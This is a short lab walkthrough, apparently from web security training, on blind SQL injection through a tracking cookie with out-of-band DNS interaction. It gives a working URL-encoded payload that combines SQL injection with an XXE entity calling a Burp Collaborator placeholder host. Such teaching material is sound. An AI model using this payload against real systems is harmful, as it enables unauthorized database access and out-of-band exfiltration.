--The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
--The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. 

--Exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

--Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

--Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
    
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
